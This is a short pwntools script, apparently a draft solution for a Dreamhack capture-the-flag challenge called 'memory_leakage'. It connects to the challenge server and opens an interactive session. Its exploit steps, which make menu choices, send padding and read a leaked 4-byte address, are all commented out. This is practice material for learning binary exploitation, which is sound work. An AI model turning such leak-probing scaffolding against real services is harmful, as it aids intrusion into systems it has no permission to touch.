from pwn import *

# p = process("./memory_leakage")
# nc host3.dreamhack.games 23727
p = remote("host3.dreamhack.games", 23727)

# debug true
# context.log_level = 'debug'

# AAAAAAAAAAAAAAAA
# p.recvuntil("> ")
# p.sendline("1")

# p.recvuntil(": ")
# p.send(b"AAAA")

# p.recvuntil(": ")
# p.sendline(b"1")

# p.recvuntil("> ")
# p.sendline("2")

# p.recvuntil("\n")
# leak = u32(p.recvline()[:4])
# print(hex(leak))



p.interactive()